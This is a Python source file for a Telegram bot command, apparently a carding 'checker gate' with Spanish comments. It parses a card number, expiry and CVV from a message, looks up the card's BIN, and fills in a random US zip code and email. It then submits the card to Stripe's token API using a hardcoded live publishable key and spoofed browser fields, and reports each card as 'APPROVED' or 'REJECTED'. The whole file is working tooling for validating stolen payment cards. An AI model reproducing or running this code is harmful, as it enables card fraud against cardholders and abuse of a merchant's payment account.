import time
import random
import string
import re
import requests

from pyrogram import Client, filters
from values import sk_headers, get_time_taken  # Solo lo que usas

@Client.on_message(filters.command("ci", prefixes=[".", "/", "!"]) & filters.text)
async def ci_handler(client, message):
    started_time = time.time()

    user_id = message.from_user.id
    nombre = message.from_user.first_name

    # Si el mensaje es respuesta a otro mensaje, toma el texto de ese mensaje
    if message.reply_to_message:
        text_to_check = message.reply_to_message.text or ""
    else:
        text_to_check = message.text or ""

    # Parseo de tarjeta con regex para números
    try:
        input_data = re.findall(r"[0-9]+", text_to_check)
        if len(input_data) < 3:
            raise ValueError("Tarjeta vacía o incompleta")

        if len(input_data) == 3:
            cc, exp, cvv = input_data
            mes = exp[:2]
            ano = exp[2:]
        else:
            cc, mes, ano, cvv = input_data[:4]

        # Corregir si mes está mal posicionado
        if len(mes) > 2:
            mes, cvv = cvv, mes

    except Exception:
        await message.reply("<b>Error al procesar tarjeta: formato incorrecto</b>")
        return

    # Validaciones básicas (puedes omitir o ajustar)
    if len(cc) not in [15, 16]:
        await message.reply("<b>Tarjeta inválida o longitud incorrecta</b>")
        return
    if not (1 <= int(mes) <= 12):
        await message.reply("<b>Mes inválido</b>")
        return
    if len(ano) == 2:
        ano = "20" + ano
    if not (2021 <= int(ano) <= 2029):
        await message.reply("<b>Año inválido</b>")
        return
    if (cc[0] == '3' and len(cvv) != 4) or len(cvv) not in [3, 4]:
        await message.reply("<b>CVV inválido</b>")
        return

    # Consulta BIN
    bin_ = cc[:6]
    bin_req = requests.get(f" https://lookup.binlist.net/{bin_}")
    if bin_req.status_code != 200:
        await message.reply("<b>Error al consultar BIN</b>")
        return

    bin_data = bin_req.json().get("data")
    if not bin_data:
        await message.reply("<b>BIN no encontrado</b>")
        return

    # Datos aleatorios para zip y email
    user_info = requests.get("https://randomuser.me/api/?nat=us&inc=name,location").json()["results"][0]
    zip_code = user_info['location']['postcode']
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"

    # Preparar payload para Stripe
    payload = {
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "card[address_zip]": zip_code,
        "guid": "NA",
        "muid": "random123",
        "sid": "random456",
        "payment_user_agent": "stripe.js",
        "time_on_page": "39315",
        "key": "pk_live_kbUIwYxKNj8PVjKFAaDN5ZN300MXislCjC"
    }

    # Solicitud a Stripe
    res = requests.post("https://api.stripe.com/v1/tokens", headers=sk_headers, data=payload)
    result = res.json()

    if "id" in result:
        status = "APPROVED✅ [CHARGED]"
    elif "error" in result:
        status = "REJECTED❌ [INCORRECT CARD]"
    else:
        status = "REJECTED❌ [ERROR]"

    # Formatear y enviar resultado
    response_text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
<b>【〄】</b> INPUT: <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>【〄】</b> RESULT: <b>{status}</b>
<b>【〄】</b> BANK INFO: <b>{bin_data.get('bank', 'N/A')} - {bin_data['countryInfo']['code']}({bin_data['countryInfo']['emoji']})</b>
<b>【〄】</b> BIN INFO: <code>{bin_}</code> - <b>{bin_data.get('level', 'N/A')}</b> - <b>{bin_data.get('type', 'N/A')}</b>
<b>【〄】</b> CHECKED BY: <b><a href="tg://user?id={user_id}">{nombre}</a></b>
<b>【〄】</b> TIME TAKING: {get_time_taken(started_time)}s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>"""

    await message.reply(response_text)
